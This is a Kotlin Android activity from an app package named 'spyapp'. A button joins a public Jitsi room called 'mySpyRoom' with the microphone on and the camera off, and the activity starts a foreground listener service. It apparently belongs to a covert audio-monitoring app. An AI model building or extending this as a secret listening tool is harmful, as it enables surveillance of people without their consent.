package com.pozetech.spyapp

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.facebook.react.modules.core.PermissionListener
import com.pozetech.spyapp.databinding.ActivityMainBinding
import org.jitsi.meet.sdk.*
import java.net.URL


class MainActivity : AppCompatActivity(), JitsiMeetActivityInterface {
    private lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.listenButton.setOnClickListener {
            val jitsiUser = JitsiMeetUserInfo()
            jitsiUser.displayName = "sakfmasfasf"
            val view = JitsiMeetView(this)
            val option = JitsiMeetConferenceOptions.Builder()
                .setServerURL(URL("https://meet.jit.si/aasdjghfsdljgdshgk#config.prejoinPageEnabled=false"))
                .setRoom("mySpyRoom")
                .setAudioMuted(false)
                .setVideoMuted(true)
                .setUserInfo(jitsiUser)
                .build()
            view.join(option)
            setContentView(view)
        }
        setService()
    }

    private fun setService() {
        val serviceIntent = Intent(this,ListenerService::class.java)
        ContextCompat.startForegroundService(this,serviceIntent)
    }


    override fun requestPermissions(p0: Array<out String>?, p1: Int, p2: PermissionListener?) {

    }
}